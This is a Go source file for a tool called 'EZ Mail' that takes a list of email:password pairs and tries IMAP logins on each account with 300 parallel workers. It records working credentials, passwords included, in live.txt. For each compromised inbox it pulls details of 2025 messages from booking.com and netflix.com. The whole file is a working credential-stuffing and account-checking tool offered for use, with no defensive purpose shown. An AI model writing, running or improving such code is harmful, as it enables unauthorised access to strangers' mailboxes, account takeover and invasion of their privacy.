package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/emersion/go-imap"
	"github.com/emersion/go-imap/client"
	"github.com/mbndr/figlet4go"
	"github.com/schollz/progressbar/v3"
)

// Progress counters
var (
	checkedCount uint64
	liveCount    uint64
	totalCount   uint64
	bar          *progressbar.ProgressBar
	messageMutex sync.Mutex
)

// ImapServers holds the mapping of email domains to their IMAP servers
var ImapServers map[string]string

type Credential struct {
	Email    string
	Password string
}

func readCredentials(filePath string) ([]Credential, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return nil, fmt.Errorf("failed to open file: %v", err)
	}
	defer file.Close()

	var credentials []Credential
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}

		parts := strings.SplitN(line, ":", 2)
		if len(parts) != 2 {
			continue
		}

		credentials = append(credentials, Credential{
			Email:    strings.TrimSpace(parts[0]),
			Password: strings.TrimSpace(parts[1]),
		})
	}

	if err := scanner.Err(); err != nil {
		return nil, fmt.Errorf("error reading file: %v", err)
	}

	return credentials, nil
}

func loadImapServers() error {
	file, err := os.ReadFile("imap_servers.json")
	if err != nil {
		return fmt.Errorf("failed to read IMAP servers file: %v", err)
	}

	if err := json.Unmarshal(file, &ImapServers); err != nil {
		return fmt.Errorf("failed to parse IMAP servers file: %v", err)
	}

	return nil
}

func login(cred Credential) (*client.Client, error) {
	parts := strings.Split(cred.Email, "@")
	if len(parts) != 2 {
		return nil, fmt.Errorf("invalid email format")
	}
	domain := parts[1]

	imapServer, ok := ImapServers[domain]
	if !ok {
		// Fallback to generic format if domain not found in config
		imapServer = fmt.Sprintf("imap.%s", domain)
	}

	c, err := client.DialTLS(imapServer+":993", nil)
	if err != nil {
		return nil, fmt.Errorf("failed to connect: %v", err)
	}

	if err := c.Login(cred.Email, cred.Password); err != nil {
		c.Logout()
		return nil, fmt.Errorf("login failed: %v", err)
	}

	return c, nil
}

func appendToMessages(content string) {
	messageMutex.Lock()
	defer messageMutex.Unlock()

	file, err := os.OpenFile("messages.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Printf("Error opening messages file: %v\n", err)
		return
	}
	defer file.Close()

	if _, err := file.WriteString(content); err != nil {
		fmt.Printf("Error writing messages: %v\n", err)
	}
}

func processAccount(cred Credential, wg *sync.WaitGroup, liveChan chan<- string) {
	defer func() {
		atomic.AddUint64(&checkedCount, 1)
		desc := fmt.Sprintf("[cyan]Checked:[reset] %d [green]Live:[reset] %d [yellow]Total:[reset] %d",
			atomic.LoadUint64(&checkedCount),
			atomic.LoadUint64(&liveCount),
			atomic.LoadUint64(&totalCount))
		bar.Describe(desc)
		bar.Add(1)
	}()
	defer wg.Done()

	c, err := login(cred)
	if err != nil {
		return
	}
	defer c.Logout()

	atomic.AddUint64(&liveCount, 1)

	totalMessages := make(map[string]int)
	senders := []string{"booking.com", "netflix.com"}

	c.Select("INBOX", false)

	for _, sender := range senders {
		criteria := imap.NewSearchCriteria()
		criteria.Header.Add("From", sender)

		// Add date criteria for 2025
		since := time.Date(2025, 1, 1, 0, 0, 0, 0, time.UTC)
		before := time.Date(2026, 1, 1, 0, 0, 0, 0, time.UTC)
		criteria.Since = since
		criteria.Before = before

		if uids, err := c.Search(criteria); err == nil {
			totalMessages[sender] = len(uids)

			if len(uids) > 0 {
				seqSet := new(imap.SeqSet)
				seqSet.AddNum(uids...)

				messages := make(chan *imap.Message, 10)
				done := make(chan error, 1)

				go func() {
					done <- c.Fetch(seqSet, []imap.FetchItem{imap.FetchEnvelope, imap.FetchBody, imap.FetchBodyStructure}, messages)
				}()

				var messageDetails []string
				for msg := range messages {
					if msg.Envelope != nil {
						fromName := "Unknown"
						fromEmail := "Unknown"
						if len(msg.Envelope.From) > 0 {
							if msg.Envelope.From[0].PersonalName != "" {
								fromName = msg.Envelope.From[0].PersonalName
							}
							if addr := msg.Envelope.From[0].MailboxName + "@" + msg.Envelope.From[0].HostName; addr != "@" {
								fromEmail = addr
							}
						}

						// Ensure the message is from 2025
						if msg.Envelope.Date.Year() == 2025 {
							detail := fmt.Sprintf("\nFrom Name: %s\nFrom Email: %s\nTo: %s\nSubject: %s\nDate: %s\nAccount: %s\n---",
								fromName,
								fromEmail,
								cred.Email,
								msg.Envelope.Subject,
								msg.Envelope.Date.Format("2006-01-02 15:04:05"),
								cred.Email)
							messageDetails = append(messageDetails, detail)
						}
					}
				}
				<-done

				if len(messageDetails) > 0 {
					content := fmt.Sprintf("\n\n=== Messages from %s ===\n%s\n",
						sender, strings.Join(messageDetails, "\n"))
					// Only append messages from the specified senders and year
					appendToMessages(content)
				}
			}
		}
	}

	var messageSummary []string
	for sender, count := range totalMessages {
		messageSummary = append(messageSummary, fmt.Sprintf("%s: %d", sender, count))
	}

	result := fmt.Sprintf("%s:%s | %s", cred.Email, cred.Password, strings.Join(messageSummary, ", "))
	liveChan <- result
}

func main() {
	if err := loadImapServers(); err != nil {
		fmt.Printf("Error: Failed to load IMAP servers: %v\n", err)
		return
	}

	credentials, err := readCredentials("data.txt")
	if err != nil {
		fmt.Printf("Error: Failed to read credentials: %v\n", err)
		return
	}

	atomic.StoreUint64(&totalCount, uint64(len(credentials)))

	// Initialize screen and show header
	fmt.Printf("\033[2J") // Clear screen
	fmt.Printf("\033[H")  // Move cursor to top

	// Create figlet
	ascii := figlet4go.NewAsciiRender()
	options := figlet4go.NewRenderOptions()
	options.FontColor = []figlet4go.Color{
		figlet4go.ColorGreen,
	}
	renderStr, _ := ascii.RenderOpts("EZ Mail", options)
	fmt.Println(renderStr)

	// Show author and time
	loc, _ := time.LoadLocation("Asia/Jakarta")
	fmt.Printf("\033[36m Made by @agp0x\033[0m | \033[33m%s WIB\033[0m\n\n", time.Now().In(loc).Format("15:04:05"))
	bar = progressbar.NewOptions(len(credentials),
		progressbar.OptionEnableColorCodes(true),
		progressbar.OptionShowCount(),
		progressbar.OptionSetWidth(40),
		progressbar.OptionSetDescription("[cyan]Starting...[reset]"),
		progressbar.OptionSetTheme(progressbar.Theme{
			Saucer:        "[green]█[reset]",
			SaucerHead:    "[green]█[reset]",
			SaucerPadding: "░",
			BarStart:      "[",
			BarEnd:        "]",
		}),
		progressbar.OptionOnCompletion(func() {
			fmt.Println() // Add newline after completion
		}))

	var wg sync.WaitGroup
	liveChan := make(chan string, len(credentials))
	semaphore := make(chan struct{}, 300)

	// Open file with synchronous writing for real-time updates
	liveFile, err := os.OpenFile("live.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY|os.O_SYNC, 0644)
	if err != nil {
		fmt.Printf("Error: Failed to open live.txt: %v\n", err)
		return
	}
	defer liveFile.Close()

	// Start a dedicated goroutine for real-time file writing
	go func() {
		for result := range liveChan {
			// Write directly to file for immediate saving
			if _, err := fmt.Fprintln(liveFile, result); err != nil {
				fmt.Printf("Error: Failed to write to live.txt: %v\n", err)
			}
		}
	}()

	// Start worker goroutines
	for _, cred := range credentials {
		wg.Add(1)
		semaphore <- struct{}{}
		go func(cred Credential) {
			processAccount(cred, &wg, liveChan)
			<-semaphore
		}(cred)
	}

	// Wait for all workers to complete
	wg.Wait()
	close(liveChan)
}
